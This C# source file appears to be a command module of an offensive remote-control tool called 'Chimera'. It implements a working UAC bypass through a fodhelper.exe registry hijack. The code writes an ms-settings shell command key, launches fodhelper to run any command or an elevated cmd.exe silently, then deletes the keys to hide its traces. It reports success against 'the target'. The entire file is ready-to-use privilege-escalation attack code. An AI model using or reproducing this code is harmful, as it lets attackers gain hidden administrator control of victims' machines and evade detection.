using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // bypass — silent UAC elevation via fodhelper.exe registry hijack.
    // No file drops, no Defender exclusion commands — clean technique only.
    // The elevated process runs whatever command is passed in the parameter.
    // If no command is given, spawns an elevated cmd.exe.
    public static class RunasExec
    {
        private const string FodHelperKey =
            @"Software\Classes\ms-settings\shell\open\command";

        public static string Execute(string command)
        {
            try
            {
                // Default: open an elevated cmd.exe if no command given
                string target = string.IsNullOrEmpty(command)
                    ? @"C:\Windows\System32\cmd.exe"
                    : command;

                // 1. Write hijack keys
                using (RegistryKey key =
                    Registry.CurrentUser.CreateSubKey(FodHelperKey))
                {
                    if (key == null)
                        return "[error] Could not create fodhelper registry key.";

                    // DelegateExecute must be present (even empty) for fodhelper to trigger
                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    key.SetValue("", target, RegistryValueKind.String);
                }

                // 2. Launch fodhelper — it auto-elevates and executes the key value
                var psi = new ProcessStartInfo("fodhelper.exe")
                {
                    UseShellExecute = false,
                    CreateNoWindow  = true
                };
                Process.Start(psi);

                // Give fodhelper time to spawn the elevated process
                System.Threading.Thread.Sleep(2500);

                // 3. Clean up registry — remove all hijack keys
                try
                {
                    Registry.CurrentUser.DeleteSubKeyTree(
                        @"Software\Classes\ms-settings", throwOnMissingSubKey: false);
                }
                catch { /* best-effort cleanup */ }

                return "[+] fodhelper UAC bypass triggered.\n" +
                       "    Command: " + target + "\n" +
                       "    Registry keys cleaned up.\n" +
                       "    Check for elevated process on the target.";
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }
    }
}
